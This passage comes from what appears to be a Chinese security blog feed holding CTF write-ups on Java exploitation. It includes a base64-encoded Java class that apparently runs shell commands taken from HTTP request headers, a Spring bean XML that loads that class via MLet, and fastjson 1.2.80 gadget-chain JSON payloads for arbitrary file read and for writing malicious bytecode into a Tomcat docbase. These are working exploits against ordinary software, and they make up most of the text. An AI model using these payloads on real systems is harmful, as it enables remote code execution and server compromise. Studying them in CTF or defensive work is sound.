bAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwBdAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAXwBgCgBeAGEKABsALwEACnByb2Nlc3NvcnMIAGQBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwBmAQAEc2l6ZQEAAygpSQwAaABpCgBnAGoBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAEgAbAoAZwBtAQADcmVxCABvAQAHZ2V0Tm90ZQgAcQEAEWphdmEvbGFuZy9JbnRlZ2VyBwBzAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7DAB1AHYJAHQAdwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DAB5AHoKAHQAewEACWdldEhlYWRlcggAfQEACWdldE1ldGhvZAwAfwAfCgAbAIAMAA4ADwoAAgCCAQALZ2V0UmVzcG9uc2UIAIQBAAlnZXRXcml0ZXIIAIYBAA5qYXZhL2lvL1dyaXRlcgcAiAEABmhhbmRsZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DACKAIsKAAIAjAEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDACOAI8KAIkAkAEABWZsdXNoDACSAAYKAIkAkwEABWNsb3NlDACVAAYKAIkAlgEABGV4ZWMBAAdvcy5uYW1lCACZAQAQamF2YS9sYW5nL1N5c3RlbQcAmwEAC2dldFByb3BlcnR5DACdAIsKAJwAngEAC3RvTG93ZXJDYXNlDACgAA8KADQAoQEAA3dpbggAowEABy9iaW4vc2gIAKUBAAItYwgApwEAB2NtZC5leGUIAKkBAAIvYwgAqwEAEWphdmEvbGFuZy9SdW50aW1lBwCtAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwArwCwCgCuALEBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DACYALMKAK4AtAEAEWphdmEvbGFuZy9Qcm9jZXNzBwC2AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAuAC5CgC3ALoBABFqYXZhL3V0aWwvU2Nhbm5lcgcAvAEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwABQC+CgC9AL8BAAJcYQgAwQEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwwAwwDECgC9AMUBAAAIAMcBAAdoYXNOZXh0AQADKClaDADJAMoKAL0AywEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwDNCgDOAAkBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsMANAA0QoAzgDSAQAEbmV4dAwA1AAPCgC9ANUBAAh0b1N0cmluZwwA1wAPCgDOANgBAApnZXRNZXNzYWdlDADaAA8KAAgA2wEAE1tMamF2YS9sYW5nL1N0cmluZzsHAN0BABNqYXZhL2lvL0lucHV0U3RyZWFtBwDfAQAGZXlKZVhBCADhAQAKc3RhcnRzV2l0aAEAFShMamF2YS9sYW5nL1N0cmluZzspWgwA4wDkCgA0AOUBAAZsZW5ndGgMAOcAaQoANADoAQAGY2hhckF0AQAEKEkpQwwA6gDrCgA0AOwBABUoQylMamF2YS9sYW5nL1N0cmluZzsMAHkA7goANADvAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkMAPEA8goAdADzAQABLggA9QEAB2luZGV4T2YMAPcA8goANAD4AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwwA+gD7CgA0APwBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDAD+AP8KAAIBAAEAAXgBAAYoW0IpW0IMAQIBAwoAAgEEAQAFKFtCKVYMAAUBBgoANAEHAQAGLzlqLzRBCAEJDACYAIsKAAIBCwEACGdldEJ5dGVzAQAEKClbQgwBDQEOCgA0AQ8BAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7DAERARIKAAIBEwEABS85az09CAEVAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcggBFwEAB2Zvck5hbWUMARkAYAoAGwEaAQAMZGVjb2RlQnVmZmVyCAE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&lt;/value&gt;</span><br><span class="language-bash"></span><br><span class="language-bash">            &lt;/list&gt;</span><br><span class="language-bash"></span><br><span class="language-bash">        &lt;/property&gt;</span><br><span class="language-bash"></span><br><span class="language-bash">    &lt;/bean&gt;</span><br><span class="language-bash"></span><br><span class="language-bash">    &lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;classLoader&quot;</span> class=<span class="hljs-string">&quot;javax.management.loading.MLet&quot;</span>/&gt;</span><br><span class="language-bash">    &lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;clazz&quot;</span> factory-bean=<span class="hljs-string">&quot;classLoader&quot;</span> factory-method=<span class="hljs-string">&quot;defineClass&quot;</span>&gt;</span><br><span class="language-bash">        &lt;constructor-arg ref=<span class="hljs-string">&quot;decoder&quot;</span>/&gt;</span><br><span class="language-bash">        &lt;constructor-arg <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;int&quot;</span> value=<span class="hljs-string">&quot;0&quot;</span>/&gt;</span><br><span class="language-bash">        &lt;constructor-arg <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;int&quot;</span> value=<span class="hljs-string">&quot;5128&quot;</span>/&gt;</span><br><span class="language-bash">    &lt;/bean&gt;</span><br><span class="language-bash"></span><br><span class="language-bash">    &lt;bean factory-bean=<span class="hljs-string">&quot;clazz&quot;</span> factory-method=<span class="hljs-string">&quot;newInstance&quot;</span>/&gt;</span><br><span class="language-bash">&lt;/beans&gt;</span><br><span class="language-bash">------WebKitFormBoundaryINBwinb4uWPnBREL--</span><br></code></pre></td></tr></table></figure><p><img src="/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/image-20250822011335430.png" alt="image-20250822011335430"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这个上传并load恶意so和无外网RCE还真值得多学习学习。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从京麒CTF2025-FastJ看fastjson的Any_File_Write-Chains</title>
    <link href="/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/"/>
    <url>/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​最近事比较多，去长沙打完软件安全赛拿了一等奖:</p><p><img src="/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/image-20250611200023261.png" alt="image-20250611200023261"></p><p>​本来是想复现一下那两道java的，其实那两道反序列化只要找到能打的Servlet就随便出了，因为依赖有CC3.1。</p><p>​但是环境不太好搭，就此作罢了hhh。</p><p>​正好最近有个京麒CTF的FastJ，打这道题必须走JDK11的fj反序列化。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>简单粗暴的交互：</p><p><img src="/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/image-20250611165719077.png" alt="image-20250611165719077"></p><h3 id="Fastjson1-2-80的任意写利用"><a href="#Fastjson1-2-80的任意写利用" class="headerlink" title="Fastjson1.2.80的任意写利用"></a>Fastjson1.2.80的任意写利用</h3><p><a href="https://github.com/luelueking/CVE-2022-25845-In-Spring">https://github.com/luelueking/CVE-2022-25845-In-Spring</a></p><p>通过这个poc可以得知，通过Exception期望类可以缓存一些新类，然后上面能缓存InputStream：</p><h4 id="Step1-把java-io-InputStream-加入-fastjson-autotype-缓存"><a href="#Step1-把java-io-InputStream-加入-fastjson-autotype-缓存" class="headerlink" title="Step1: 把java.io.InputStream 加入 fastjson autotype 缓存"></a>Step1: 把java.io.InputStream 加入 fastjson autotype 缓存</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;    \&quot;@type\&quot;: \&quot;java.lang.Exception\&quot;,    \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.exc.InputCoercionException\&quot;,    \&quot;p\&quot;: &#123;    &#125;  &#125;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.a.a&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonParser\&quot;,  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\&quot;,  \&quot;in\&quot;: &#123;&#125;&#125;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;d&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.c.c&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>[<img src="https://github.com/luelueking/CVE-2022-25845-In-Spring/raw/main/images/%E6%88%AA%E5%B1%8F2024-11-07%2021.36.27.png" alt="截屏2024-11-07 21.36.27">](<a href="https://github.com/luelueking/CVE-2022-25845-In-Spring/blob/main/images/%E6%88%AA%E5%B1%8F2024-11-07">https://github.com/luelueking/CVE-2022-25845-In-Spring/blob/main/images/截屏2024-11-07</a> 21.36.27.png)</p><h4 id="Step2-file协议读取-tmp内容，获取tomcat的docbase文件名称"><a href="#Step2-file协议读取-tmp内容，获取tomcat的docbase文件名称" class="headerlink" title="Step2: file协议读取&#x2F;tmp内容，获取tomcat的docbase文件名称"></a>Step2: file协议读取&#x2F;tmp内容，获取tomcat的docbase文件名称</h4><blockquote><p>逐字节读取内容</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.InputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1024&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> $<span class="hljs-punctuation">&#123;</span>data<span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>      <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.a.delegate&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>[<img src="https://github.com/luelueking/CVE-2022-25845-In-Spring/raw/main/images/%E6%88%AA%E5%B1%8F2024-11-07%2021.35.56.png" alt="截屏2024-11-07 21.35.56">](<a href="https://github.com/luelueking/CVE-2022-25845-In-Spring/blob/main/images/%E6%88%AA%E5%B1%8F2024-11-07">https://github.com/luelueking/CVE-2022-25845-In-Spring/blob/main/images/截屏2024-11-07</a> 21.35.56.png)</p><h4 id="Step3-写入恶意字节码到docbase目录下"><a href="#Step3-写入恶意字节码到docbase目录下" class="headerlink" title="Step3: 写入恶意字节码到docbase目录下"></a>Step3: 写入恶意字节码到docbase目录下</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.InputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.AutoCloseInputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;in&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.CharSequenceInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;cs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.String&quot;</span><br>          <span class="hljs-string">&quot;$&#123;shellcode&#125;&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;charset&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;iso-8859-1&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> $<span class="hljs-punctuation">&#123;</span>size<span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.output.LockableFileWriter&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;file2write&#125;&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;charset&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;iso-8859-1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;charset&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;iso-8859-1&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;writeImmediately&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.InputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;inputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.a&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;iso-8859-1&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;iso-8859-1&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>[<img src="https://github.com/luelueking/CVE-2022-25845-In-Spring/raw/main/images/%E6%88%AA%E5%B1%8F2024-11-07%2021.37.04.png" alt="截屏2024-11-07 